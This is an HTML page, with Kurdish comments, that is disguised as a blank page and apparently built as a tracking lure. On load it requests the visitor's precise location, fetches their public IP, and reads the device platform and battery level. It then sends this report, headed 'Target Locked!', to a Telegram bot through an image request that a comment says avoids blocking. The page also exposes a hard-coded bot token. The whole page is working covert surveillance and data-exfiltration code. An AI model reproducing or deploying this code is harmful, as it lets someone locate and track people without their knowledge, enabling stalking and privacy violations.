<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: white; margin: 0; }</style>
</head>
<body onload="capture()">

<script>
    const TOKEN = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    function _send(uid, text) {
        // بەکارهێنانی وێنەیەک بۆ ناردنی داتا (ئەمە هەرگیز بلۆک ناکرێت)
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
        const img = new Image();
        img.src = url;
    }

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // وەرگرتنی IP
            let ip = "N/A";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }

            let report = `🚨 <b>Target Locked!</b>\n\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🌐 <b>IP:</b> ${ip}\n` +
                         `📱 <b>Device:</b> ${navigator.platform}\n` +
                         `🔋 <b>Battery:</b> ${bat}`;

            _send(uid, report);

        }, (err) => {
            _send(uid, "⚠️ Target Denied Location!");
        }, { enableHighAccuracy: true });
    }
</script>
</body>
</html>
